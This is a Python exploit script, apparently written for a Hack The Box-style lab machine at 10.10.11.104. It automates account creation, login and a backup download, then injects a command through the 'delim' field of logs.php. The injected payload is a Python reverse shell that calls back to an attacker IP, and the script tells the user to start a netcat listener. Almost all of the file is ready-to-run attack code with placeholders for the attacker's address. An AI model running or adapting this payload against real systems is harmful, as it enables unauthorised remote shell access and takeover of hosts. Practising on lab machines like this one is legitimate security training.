#!/usr/bin/python3

##########################
#			 #
#   Author: S0ftD3ath    #
#			 #
##########################

import requests
import signal
import sys
import time
import os
from pwn import *

# Global Variables
ip = '10.10.16.12' # <- Change this
port = 443 # <- Change this
urlLogin = 'http://10.10.11.104/login.php'
urlCreateAccount = 'http://10.10.11.104/accounts.php'
urlBackup = 'http://10.10.11.104/download.php?file=32'
urlRCE = 'http://10.10.11.104/logs.php'
usernamePass = time.time_ns()
payload = 'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'' % (ip, port)
burp = { 'http': 'http://127.0.0.1:8080' }

s = requests.Session()

#Ctrl+C
def def_handler(sig, frame):
    print('\n[-] Exiting...')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def createAccount():

    data = {
        'username': usernamePass,
        'password': usernamePass,
        'confirm': usernamePass,
        'submit': ''
    }

    p1 = log.progress('Creating Admin Account')
    r = requests.post( urlCreateAccount, data=data )
    p1.success('\n[+] Username: %s\n[+] Password: %s' % (usernamePass, usernamePass))

def login():

    data = {
        'username': usernamePass,
        'password': usernamePass
    }

    p2 = log.progress('Logging In')
    r = s.post( urlLogin, data=data )
    p2.success('Logged In as %s' % usernamePass)

def download():

    p3 = log.progress('Downloading Backup')
    r = s.get( urlBackup, allow_redirects=True )
    open('back.zip', 'wb').write(r.content)
    p3.status('Unzipping Backup')
    os.system('unzip back.zip')
    p3.success('File downloaded and unzipped successfully')

    print('\n[*] Vulnerable Code\n')
    vc = os.system('cat ./logs.php | grep "\$output = exec("')
    print("%s\n\n" % vc)

def intrusion(): 
    
    time.sleep(5)
    p4 = log.progress('Gaining Access To The System')
    data = {
        'delim': 'comma; %s' % payload
    }
    
    s.post( urlRCE, data=data )

    time.sleep(2)
    p4.success('Gained access to system successfully. Good luck on getting root ;-)\n')

    sys.exit(0)

if __name__ == '__main__':

    print("[*] Please execute the following command in another terminal: \n\n$ nc -nlvp %s\n" % port)

    # Call create account function
    createAccount()
    # Login
    login()
    # Download Backup
    download()
    # Accessing
    intrusion()

